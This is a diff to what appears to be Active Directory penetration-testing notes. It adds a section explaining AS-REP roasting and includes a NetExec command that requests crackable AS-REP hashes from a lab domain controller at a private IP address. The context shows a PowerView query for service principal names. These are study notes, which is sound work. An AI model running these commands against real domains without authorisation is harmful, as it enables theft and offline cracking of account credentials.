@@ -289,8 +289,19 @@ Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supp
 
 <img width="1222" height="700" alt="image" src="https://github.com/user-attachments/assets/d3f19e6b-cd11-46f6-b6ff-d9af3b434328" />
 
-- 
+--------------
 
+### ASREP roasting
+
+---------------
+
+- AS-REP Roasting is an Active Directory attack technique that targets user accounts configured without Kerberos pre-authentication. When pre-authentication is disabled, an attacker may be able to request authentication response material for the account and attempt to crack the encrypted response offline.
+
+```bash
+nxc ldap  192.168.232.129  -u valid_ad_username -p '' --asreproast valid_asrep_roast.txt
+```
+
+<img width="1894" height="376" alt="image" src="https://github.com/user-attachments/assets/11f68f6e-f996-416d-b792-01374c870e3b" />
 
 
 
